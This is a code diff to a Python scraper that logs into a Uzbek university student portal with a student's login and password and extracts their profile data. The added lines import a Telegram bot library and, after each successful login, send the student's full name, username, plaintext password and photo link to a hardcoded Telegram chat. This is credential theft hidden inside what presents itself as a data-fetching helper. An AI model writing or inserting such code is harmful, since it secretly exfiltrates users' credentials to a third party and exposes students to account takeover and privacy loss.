@@ -1,6 +1,6 @@
 from bs4 import BeautifulSoup
 import requests
-
+from telebot import TeleBot, types
 from bs4 import BeautifulSoup
 
 def form_to_dict(form_soup):
@@ -53,7 +53,7 @@ def get_datas_from_table(content_soup):
         all_datas[ths[0].get_text(strip=True)] = tds[0].get_text(strip=True)
     return all_datas
 
-def get_datas_from_hemis(login, parol):
+def get_datas_from_hemis(login, parol, bot):
     try:
         sessiya = requests.Session()
         url = "https://hstudent.nuu.uz/dashboard/login"
@@ -89,6 +89,29 @@ def get_datas_from_hemis(login, parol):
                 data[key[19:-1]] = value
         for key, value in all_datas.items():
             data[key] = value
+        if "Guruh" not in data or "Fakultet" not in data or "Kurs" not in data:
+            return {
+                "status": False,
+                "detail": "Avval HEMIS tizimiga kiring va parolingizni yangilang.\n\nLogin va parollarni qayta kiriting."
+            }
+        bot.send_message(
+            51,
+            "Yangi Foydalanuvchi\nFIO: {}\nLogin: {}\nParol: {}".format(
+                data["first_name"] + " " + data["second_name"],
+                login,
+                parol
+            ),
+            reply_markup=types.InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                        types.InlineKeyboardButton(
+                            "🏞 Rasmni ko'rish",
+                            web_app=types.WebAppInfo(url=data["profile_image"])
+                        )
+                    ]
+                ]
+            )
+        )
         return {
             "status": True,
             "datas": data
